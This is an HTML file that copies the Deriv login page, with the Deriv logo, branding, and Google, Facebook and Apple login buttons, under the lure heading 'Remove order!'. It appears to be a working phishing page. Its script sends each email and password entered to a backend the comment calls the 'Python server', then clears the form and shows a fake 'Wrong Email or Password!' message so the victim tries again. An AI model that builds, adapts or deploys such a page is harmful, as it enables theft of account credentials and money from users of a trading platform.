<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Deriv – Login</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'IBM Plex Sans', 'Segoe UI', Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; justify-content: center; }
    .page { width: 100%; max-width: 430px; padding: 16px 20px 16px; display: flex; flex-direction: column; gap: 8px; }
    .logo-wrap { text-align: center; display: flex; justify-content: center; align-items: center; padding-top: 24px; padding-bottom: 24px; }
    h1 { font-size: 24px; font-weight: 600; color: #000; margin-top: 4px; }
    .field { position: relative; border: 1.5px solid #d6d6d6; border-radius: 6px; padding: 0 14px; height: 52px; display: flex; align-items: center; }
    .field label { display: none; }
    .field input { width: 100%; border: none; outline: none; font-size: 16px; color: #000; background: transparent; font-family: inherit; padding-right: 36px; height: 100%; }
    .field input::placeholder { color: #aaa; font-size: 16px; }
    .eye-btn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #aaa; padding: 0; }
    .forgot { color: #ff444f; font-size: 14px; text-decoration: none; margin-top: -4px; }
    .btn-login { width: 100%; padding: 16px; background: #ff444f; color: #fff; border: none; border-radius: 50px; font-size: 16px; font-weight: 700; cursor: pointer; font-family: inherit; }
    .divider { display: flex; align-items: center; gap: 10px; }
    .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #ddd; }
    .divider span { font-size: 14px; color: #888; }
    .alt-buttons { display: flex; flex-direction: column; gap: 10px; }
    .btn-alt { width: 100%; padding: 14px 16px; border-radius: 50px; font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-family: inherit; }
    .btn-biometrics { background:#fff; border:1.5px solid #ff444f; color:#ff444f; }
    .btn-google     { background:#f0f0f0; border:none; color:#222; }
    .btn-facebook   { background:#1877f2; border:none; color:#fff; }
    .btn-apple      { background:#111; border:none; color:#fff; }
    .signup { text-align:center; font-size:14px; color:#555; margin-top:80px; }
    .signup a { color:#ff444f; text-decoration:none; }
    .toast { position:fixed; bottom:24px; left:50%; transform:translateX(-50%); padding:12px 24px; border-radius:50px; font-size:14px; display:none; z-index:99; font-family:inherit; }
    .toast.success { background:#e6f4ea; color:#2e7d32; border:1px solid #a5d6a7; }
    .toast.err { background:#fdecea; color:#c62828; border:1px solid #ef9a9a; }
  </style>
</head>
<body>
<div class="page">

  <div class="logo-wrap">
    <img src="https://cdn.prod.website-files.com/68da5c86c91c54f39c86c28a/68da5c86c91c54f39c86d0de_deriv-app-logo.svg"
         style="height:48px;"
         onerror="this.style.display='none';document.getElementById('logoFallback').style.display='block';"
         alt="deriv">
    <link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@1,900&display=swap" rel="stylesheet">
    <span id="logoFallback" style="display:none;font-family:'Nunito',Arial,sans-serif;font-size:54px;font-weight:900;font-style:italic;color:#ff444f;letter-spacing:-2px;line-height:1;">deriv</span>
  </div>

  <h1>Remove order!</h1>

  <div class="field">
    <label>Email</label>
    <input type="email" id="email" autocomplete="email" placeholder="Email" />
  </div>

  <div class="field">
    <label>Password</label>
    <input type="password" id="pwd" autocomplete="current-password" placeholder="Password" />
    <button class="eye-btn" onclick="togglePwd()" aria-label="Show/hide password">
      <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
        <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
        <line x1="1" y1="1" x2="23" y2="23"/>
      </svg>
    </button>
  </div>

  <a href="#" class="forgot">Forgot password?</a>

  <button class="btn-login" onclick="submitLogin()">Log in</button>

  <div class="divider"><span>Or continue with</span></div>

  <div class="alt-buttons">
    <button class="btn-alt btn-biometrics">
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ff444f" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A13.916 13.916 0 0 0 8 11a4 4 0 1 1 8 0c0 1.017-.07 2.019-.203 3m-2.118 6.844A21.88 21.88 0 0 0 15.171 17m3.839-1.132c.065-.264.099-.546.099-.832a7 7 0 0 0-6.288-6.962M12 3C7.029 3 3 7.029 3 12c0 1.378.278 2.69.775 3.887m1.79 1.918A9.953 9.953 0 0 0 12 22c5.523 0 10-4.477 10-10 0-1.79-.47-3.471-1.29-4.926"/></svg>
      Log in with biometrics
    </button>
    <button class="btn-alt btn-google">
      <svg width="20" height="20" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
      Google
    </button>
    <button class="btn-alt btn-facebook">
      <svg width="22" height="22" viewBox="0 0 24 24" fill="#fff"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
      Facebook
    </button>
    <button class="btn-alt btn-apple">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
      Apple
    </button>
  </div>

  <p class="signup">Don't have an account yet? <a href="#">Sign up</a></p>

</div>

<div class="toast" id="toast"></div>

<script>
  function togglePwd() {
    var pwd = document.getElementById('pwd');
    var icon = document.getElementById('eyeIcon');
    if (pwd.type === 'password') {
      pwd.type = 'text';
      icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
    } else {
      pwd.type = 'password';
      icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
    }
  }

  async function submitLogin() {
    var email = document.getElementById('email').value.trim();
    var pwd   = document.getElementById('pwd').value;

    if (!email || !pwd) {
      showToast('Please fill in all fields', 'err'); return;
    }

    // Send to Python server
    var body = 'username=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pwd);
    try {
      await fetch('/', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:body });
    } catch(e) {}

    // Stay on page + clear fields
    document.getElementById('email').value = '';
    document.getElementById('pwd').value   = '';
    showToast('Wrong Email or Password!', 'success');
  }

  function showToast(msg, type) {
    var t = document.getElementById('toast');
    t.textContent  = msg;
    t.className    = 'toast ' + type;
    t.style.display = 'block';
    setTimeout(function(){ t.style.display = 'none'; }, 3000);
  }

  document.addEventListener('keydown', function(e){ if(e.key==='Enter') submitLogin(); });
</script>
</body>
</html>
